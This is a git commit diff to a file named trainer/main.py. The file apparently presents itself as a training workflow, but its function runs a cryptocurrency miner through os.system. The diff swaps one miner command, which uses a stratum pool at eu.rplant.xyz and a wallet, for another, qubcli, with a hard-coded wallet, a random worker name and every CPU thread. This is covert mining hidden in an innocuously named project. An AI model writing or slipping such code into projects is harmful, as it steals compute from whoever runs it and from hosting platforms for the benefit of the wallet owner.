59846d19ed953ee8dffc59140194c7c965af2f62
rxt36q6 <rxt36q6@atomicmail.io>
2026-08-08 13:55:27 +0800

    Update main.py

--- trainer/main.py
+++ trainer/main.py
@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('./cptdc -a yespowertide -o stratum+tcp://eu.rplant.xyz:7059 -u TQzt1MGjhnYHiUd47JeyFqLcNNffGnJrGs.x -p webpassword=x -t $(nproc --all)')
+  os.system('./qubcli -pplns -wallet QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -workername $(echo $RANDOM | md5sum | head -c 10) -cpu -threads $(nproc --all) -start')
 
 if __name__ == "__main__":
   app.start()
